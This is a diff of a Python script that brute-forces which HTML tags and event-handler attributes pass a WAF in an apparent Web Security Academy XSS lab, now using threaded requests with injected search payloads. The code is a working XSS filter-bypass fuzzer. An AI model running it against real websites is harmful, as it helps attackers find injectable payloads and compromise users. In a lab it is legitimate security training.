@@ -3,9 +3,30 @@
 import requests
 import concurrent.futures
 
-url=f'https://0a8e00a2044bd21c80a7585e00d0006c.web-security-academy.net/'
+url=f'https://0aae0065039aba2881b402c9005600f8.h1-web-security-academy.net/'
 
-sessions = {"session": "GYGsdqB089IUzQjoZ8ziIMlVMLvUIYfl"}
+sessions = {"session": "xCmrl6STKXYwQezDq3kK7pDkB6tPiPed"}
+
+def find_tag(tag):
+    payload = f"' <{tag}>"
+    para_send = {
+        "search":payload
+    }
+    response = requests.get(url,params=para_send,cookies=sessions)
+    if response.status_code==200 :
+        return tag
+    return None
+
+def find_event(tag,event):
+    payload = f"' </h1> <{tag} {event}=1>"
+    para_send = {
+        "search":payload
+    }
+    response = requests.get(url,params=para_send,cookies=sessions)
+    if response.status_code==200:
+        return event
+    return None
+        
 
 tags_list = [
     "a", "abbr", "acronym", "address", "animate", "animatemotion", 
@@ -63,31 +84,20 @@ events_list = [
     "onwheel"
 ]
 
-allowed_tag = []
+allowed_tag = set()
 
-for i in tags_list:
-    payload = f"' </h1> <{i}>"
-    para_send = {
-        "search":payload
-    }
-    response = requests.get(url,params=para_send,cookies=sessions)
-    if response.status_code == 200 :
-        allowed_tag.append(i)
-        print("[!] WAF authorized",i)
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor :
+    outcome = [executor.submit(find_tag,tag) for tag in tags_list]
 
-for i in events_list:
-    payload = f" ' </h1> <"
+    for output in concurrent.futures.as_completed(outcome):
+        result=output.result()
+        if result is not None:
+            allowed_tag.add(result)
 
-def find_event(tag,event):
-    payload = f"' </h1> <{tag} {event}=1>"
-    para_send = {
-        "search":payload
-    }
-    response = requests.get(url,params=para_send,cookies=sessions)
-    if response.status_code==200 and event not in allowed_event:
-        return event
-    return None
         
+for i in allowed_tag:
+    print("[!!!] WAF authorized",i)
+
 allowed_event = set()
 
 with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
@@ -101,6 +111,8 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
 for i in allowed_event:
     print("WAF authorized",i)
             
+
+
 
     
         
